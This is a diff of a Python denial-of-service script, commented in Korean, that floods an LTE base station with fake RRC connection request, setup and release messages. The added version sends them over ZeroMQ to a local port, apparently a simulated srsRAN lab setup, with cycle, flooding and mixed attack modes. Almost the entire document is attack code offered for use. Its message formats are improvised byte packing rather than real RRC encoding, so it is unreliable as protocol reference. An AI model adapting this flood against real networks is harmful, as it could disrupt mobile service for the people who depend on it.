@@ -1,109 +1,165 @@
 #!/usr/bin/env python3
 """
-LTE RRC Connection Flood Attack
-srsRAN 환경에서 RRC 연결 요청을 대량으로 전송하여 eNB의 리소스를 고갈시키는 공격
+RRC Connection Flood Attack
+RRC 연결 과정을 반복하여 eNB의 연결 관리 리소스를 고갈시키는 공격
 """
 
-import socket
+import zmq
 import struct
 import time
 import threading
 import random
-from scapy.all import *
-from scapy.layers.inet import IP, UDP
-from scapy.layers.l2 import Ether
+from datetime import datetime
 
 class RRCConnectionFlood:
-    def __init__(self, num_ues=1000):
-        # 환경변수에서 설정 읽기
-        import os
-        self.target_ip = os.getenv('ENB_IP')
-        self.target_port = int(os.getenv('ENB_RX_PORT'))
-        self.num_ues = num_ues
-        self.attack_threads = []
+    def __init__(self, target_port=2001):
+        self.target_port = target_port
+        self.context = zmq.Context()
         self.running = False
+        self.attack_threads = []
         
-    def generate_ue_identity(self):
-        """임의의 UE 식별자 생성"""
-        return random.randint(1, 4294967295)  # 32비트 unsigned int 범위
-    
     def create_rrc_connection_request(self, ue_id):
         """RRC Connection Request 메시지 생성"""
-        # 간단한 RRC Connection Request 패킷 구조
-        # 실제로는 더 복잡한 ASN.1 인코딩이 필요
-        rrc_msg = struct.pack('>I', ue_id)  # UE ID
-        rrc_msg += struct.pack('>H', 0x0001)  # Message Type (Connection Request)
-        rrc_msg += struct.pack('>H', 0x0000)  # Establishment Cause
-        return rrc_msg
-    
-    def send_rrc_request(self, ue_id, duration=60):
-        """개별 UE의 RRC 연결 요청 전송"""
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        start_time = time.time()
-        packet_count = 0
+        message = struct.pack('>H', 0x0001)  # Message Type: RRC Connection Request
+        message += struct.pack('>I', ue_id)  # UE Identity
+        message += struct.pack('>H', 0x0000)  # Establishment Cause: Emergency
+        message += struct.pack('>H', 0x0000)  # Spare
         
-        print(f"[{time.strftime('%H:%M:%S')}] UE {ue_id:08x} 연결 시도 시작")
+        # 복잡한 UE 정보 추가 (처리 부담 증가)
+        message += struct.pack('>Q', random.randint(1000000000000000, 9999999999999999))  # IMSI
+        message += struct.pack('>I', random.randint(1, 1000000))  # TMSI
+        message += struct.pack('>H', random.randint(1, 65535))  # LAI
+        message += struct.pack('>B', random.randint(1, 255))  # RRC State
+        message += struct.pack('>I', random.randint(1, 1000000))  # Cell ID
+        message += struct.pack('>H', random.randint(1, 65535))  # Tracking Area Code
+        
+        return message
+    
+    def create_rrc_connection_setup_complete(self, ue_id):
+        """RRC Connection Setup Complete 메시지 생성"""
+        message = struct.pack('>H', 0x0003)  # Message Type: RRC Connection Setup Complete
+        message += struct.pack('>I', ue_id)  # UE Identity
+        message += struct.pack('>H', 0x0000)  # Spare
+        
+        # NAS 메시지 포함 (추가 처리 부담)
+        message += struct.pack('>B', 0x41)  # NAS Message Type: Attach Request
+        message += struct.pack('>Q', random.randint(1000000000000000, 9999999999999999))  # IMSI
+        message += struct.pack('>I', random.randint(1, 1000000))  # TMSI
+        message += struct.pack('>H', random.randint(1, 65535))  # LAI
+        
+        return message
+    
+    def create_rrc_connection_release_request(self, ue_id):
+        """RRC Connection Release Request 메시지 생성"""
+        message = struct.pack('>H', 0x0004)  # Message Type: RRC Connection Release Request
+        message += struct.pack('>I', ue_id)  # UE Identity
+        message += struct.pack('>H', 0x0000)  # Spare
+        
+        # Release Cause (복잡한 원인)
+        message += struct.pack('>B', random.randint(1, 10))  # Release Cause
+        message += struct.pack('>I', random.randint(1, 1000000))  # Cell ID
+        
+        return message
+    
+    def send_message(self, message, message_type):
+        """메시지 전송"""
+        try:
+            socket = self.context.socket(zmq.PUSH)
+            socket.connect(f'tcp://localhost:{self.target_port}')
+            
+            socket.send(message, zmq.NOBLOCK)
+            print(f"[{datetime.now().strftime('%H:%M:%S')}] {message_type}: {len(message)} bytes")
+            
+            socket.close()
+            return True
+            
+        except Exception as e:
+            print(f"메시지 전송 오류: {e}")
+            return False
+    
+    def rrc_connection_cycle(self, ue_id, duration=60):
+        """RRC 연결 사이클 공격"""
+        start_time = time.time()
+        cycle_count = 0
         
         while self.running and (time.time() - start_time) < duration:
             try:
-                # RRC Connection Request 생성
-                rrc_packet = self.create_rrc_connection_request(ue_id)
+                # 1단계: RRC Connection Request
+                rrc_request = self.create_rrc_connection_request(ue_id)
+                self.send_message(rrc_request, f"RRC Connection Request #{cycle_count}")
+                time.sleep(0.1)
                 
-                # UDP 패킷으로 전송
-                sock.sendto(rrc_packet, (self.target_ip, self.target_port))
-                packet_count += 1
+                # 2단계: RRC Connection Setup Complete
+                rrc_complete = self.create_rrc_connection_setup_complete(ue_id)
+                self.send_message(rrc_complete, f"RRC Connection Setup Complete #{cycle_count}")
+                time.sleep(0.1)
                 
-                # 10개 패킷마다 로그 출력
-                if packet_count % 10 == 0:
-                    elapsed = time.time() - start_time
-                    print(f"[{time.strftime('%H:%M:%S')}] UE {ue_id:08x} 패킷 {packet_count}개 전송 (경과: {elapsed:.1f}초)")
+                # 3단계: RRC Connection Release Request
+                rrc_release = self.create_rrc_connection_release_request(ue_id)
+                self.send_message(rrc_release, f"RRC Connection Release Request #{cycle_count}")
                 
-                # 랜덤 간격으로 전송 (더 현실적인 패턴)
-                time.sleep(random.uniform(0.1, 0.5))
+                cycle_count += 1
+                time.sleep(0.2)  # 다음 사이클까지 대기
                 
             except Exception as e:
-                print(f"[{time.strftime('%H:%M:%S')}] UE {ue_id:08x} 전송 오류: {e}")
-                break
-        
-        elapsed = time.time() - start_time
-        print(f"[{time.strftime('%H:%M:%S')}] UE {ue_id:08x} 연결 시도 완료 - 총 {packet_count}개 패킷 전송 ({elapsed:.1f}초)")
-        sock.close()
+                print(f"RRC 연결 사이클 오류: {e}")
+                time.sleep(1)
     
-    def start_attack(self, duration=60):
+    def flooding_attack(self, num_ues=100, duration=60):
+        """플러딩 공격 (다수 UE 동시 공격)"""
+        start_time = time.time()
+        
+        while self.running and (time.time() - start_time) < duration:
+            try:
+                # 다수 UE가 동시에 RRC Connection Request 전송
+                for ue_id in range(num_ues):
+                    rrc_request = self.create_rrc_connection_request(1000 + ue_id)
+                    self.send_message(rrc_request, f"Flooding UE {ue_id}")
+                    time.sleep(0.001)  # 매우 짧은 간격
+                
+                time.sleep(0.1)  # 다음 라운드까지 대기
+                
+            except Exception as e:
+                print(f"플러딩 공격 오류: {e}")
+                time.sleep(1)
+    
+    def start_attack(self, attack_type="cycle", num_ues=10, duration=60):
         """공격 시작"""
-        print(f"\n{'='*60}")
-        print(f"🚀 RRC Connection Flood 공격 시작")
-        print(f"{'='*60}")
-        print(f"📡 대상: {self.target_ip}:{self.target_port}")
-        print(f"👥 UE 수: {self.num_ues}")
-        print(f"⏱️  지속 시간: {duration}초")
-        print(f"🕐 시작 시간: {time.strftime('%Y-%m-%d %H:%M:%S')}")
-        print(f"{'='*60}")
+        print(f"=== RRC Connection Flood Attack 시작 ===")
+        print(f"공격 유형: {attack_type}")
+        print(f"UE 수: {num_ues}")
+        print(f"지속 시간: {duration}초")
+        print(f"대상 포트: {self.target_port}")
+        print("=" * 50)
         
         self.running = True
         
-        # 각 UE에 대해 별도 스레드 생성
-        print(f"🔄 UE 스레드 생성 중...")
-        for i in range(self.num_ues):
-            ue_id = self.generate_ue_identity()
-            thread = threading.Thread(
-                target=self.send_rrc_request, 
-                args=(ue_id, duration)
-            )
+        if attack_type == "cycle":
+            # RRC 연결 사이클 공격
+            thread = threading.Thread(target=self.rrc_connection_cycle, args=(1000, duration))
             thread.daemon = True
             thread.start()
             self.attack_threads.append(thread)
             
-            # 50개마다 진행 상황 출력
-            if (i + 1) % 50 == 0:
-                print(f"✅ {i + 1}/{self.num_ues} UE 스레드 생성 완료")
+        elif attack_type == "flooding":
+            # 플러딩 공격
+            thread = threading.Thread(target=self.flooding_attack, args=(num_ues, duration))
+            thread.daemon = True
+            thread.start()
+            self.attack_threads.append(thread)
             
-            # 스레드 생성 간격 조절
-            time.sleep(0.01)
-        
-        print(f"🎯 {self.num_ues}개 UE 스레드 모두 시작됨!")
-        print(f"🔥 공격 진행 중... (Ctrl+C로 중단 가능)")
-        print(f"{'='*60}")
+        elif attack_type == "mixed":
+            # 혼합 공격
+            thread1 = threading.Thread(target=self.rrc_connection_cycle, args=(1000, duration))
+            thread2 = threading.Thread(target=self.flooding_attack, args=(num_ues, duration))
+            
+            thread1.daemon = True
+            thread2.daemon = True
+            
+            thread1.start()
+            thread2.start()
+            
+            self.attack_threads.extend([thread1, thread2])
         
         # 공격 지속 시간 대기
         time.sleep(duration)
@@ -111,32 +167,33 @@ class RRCConnectionFlood:
     
     def stop_attack(self):
         """공격 중지"""
-        print(f"\n{'='*60}")
-        print(f"🛑 공격 중지 중...")
-        print(f"{'='*60}")
+        print("\n=== 공격 중지 ===")
         self.running = False
         
-        # 모든 스레드 종료 대기
-        print(f"⏳ UE 스레드 종료 대기 중...")
-        for i, thread in enumerate(self.attack_threads):
+        # 스레드 종료 대기
+        for thread in self.attack_threads:
             thread.join(timeout=1)
-            if (i + 1) % 100 == 0:
-                print(f"✅ {i + 1}/{len(self.attack_threads)} 스레드 종료 완료")
         
-        print(f"🎉 공격 완료!")
-        print(f"🕐 종료 시간: {time.strftime('%Y-%m-%d %H:%M:%S')}")
-        print(f"{'='*60}")
+        # ZeroMQ 정리
+        self.context.term()
+        print("공격 완료")
 
 def main():
-    # 공격 파라미터
-    num_ues = 500           # 동시 UE 수
-    duration = 120          # 공격 지속 시간 (초)
+    import argparse
     
-    # 공격 실행 (환경변수에서 설정 자동 읽기)
-    attack = RRCConnectionFlood(num_ues)
+    parser = argparse.ArgumentParser(description='RRC Connection Flood Attack')
+    parser.add_argument('--attack-type', choices=['cycle', 'flooding', 'mixed'], 
+                       default='cycle', help='공격 유형')
+    parser.add_argument('--num-ues', type=int, default=10, help='UE 수')
+    parser.add_argument('--duration', type=int, default=60, help='공격 지속 시간 (초)')
+    parser.add_argument('--target-port', type=int, default=2001, help='대상 포트')
+    
+    args = parser.parse_args()
+    
+    attack = RRCConnectionFlood(args.target_port)
     
     try:
-        attack.start_attack(duration)
+        attack.start_attack(args.attack_type, args.num_ues, args.duration)
     except KeyboardInterrupt:
         print("\n사용자에 의해 중단됨")
         attack.stop_attack()
